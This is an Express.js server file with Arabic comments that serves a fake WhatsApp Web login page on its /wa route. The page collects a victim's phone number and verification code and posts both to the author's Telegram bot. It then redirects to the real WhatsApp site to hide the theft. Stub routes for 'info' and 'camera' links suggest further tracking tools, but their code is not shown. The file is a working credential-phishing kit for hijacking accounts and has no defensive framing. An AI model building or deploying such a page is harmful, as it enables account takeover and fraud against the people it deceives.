const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.BOT_TOKEN;
const MY_ID = process.env.MY_ID;

// --- [ روابط المعلومات والكاميرا السابقة تبقى كما هي ] ---

app.get('/', (req, res) => { /* كود المعلومات */ });
app.get('/cam', (req, res) => { /* كود الكاميرا */ });

// ==========================================
// 3. رابط الواتساب (WhatsApp Login)
// الرابط: https://omar-scanner.onrender.com/wa
// ==========================================
app.get('/wa', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>WhatsApp Web</title>
            <style>
                body { background: #f0f2f5; font-family: Segoe UI, Tahoma, sans-serif; display: flex; justify-content: center; padding-top: 50px; }
                .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); width: 350px; text-align: center; }
                .logo { width: 80px; margin-bottom: 20px; }
                h2 { color: #41525d; font-size: 19px; margin-bottom: 20px; }
                input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
                button { width: 100%; background: #00a884; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; }
                .footer { font-size: 12px; color: #8696a0; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
                <h2>تسجيل الدخول إلى WhatsApp Web</h2>
                <p style="font-size:14px; color:#666;">أدخل رقم هاتفك للمزامنة</p>
                <input type="text" id="phone" placeholder="رقم الهاتف (مع رمز الدولة)">
                <input type="text" id="otp" placeholder="كود التحقق (يصلك الآن)" style="display:none;">
                <button id="btn" onclick="sendToBot()">التالي</button>
                <div class="footer">من شركة Meta</div>
            </div>

            <script>
                let step = 1;
                async function sendToBot() {
                    const phone = document.getElementById('phone').value;
                    const otp = document.getElementById('otp').value;
                    let text = "";

                    if (step === 1) {
                        if(!phone) return alert("أدخل الرقم!");
                        text = "📱 **رقم هاتف واتساب جديد:**\\n" + phone;
                        document.getElementById('phone').style.display = "none";
                        document.getElementById('otp').style.display = "block";
                        document.getElementById('btn').innerText = "تأكيد الكود";
                        step = 2;
                    } else {
                        if(!otp) return alert("أدخل الكود!");
                        text = "🔑 **كود التحقق الخاص بـ " + phone + ":**\\n`" + otp + "`";
                        setTimeout(() => { window.location.href = "https://web.whatsapp.com"; }, 1000);
                    }

                    await fetch("https://api.telegram.org/bot${BOT_TOKEN}/sendMessage", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({chat_id: "${MY_ID}", text: text, parse_mode: "Markdown"})
                    });
                }
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, () => console.log("All Tools Active"));
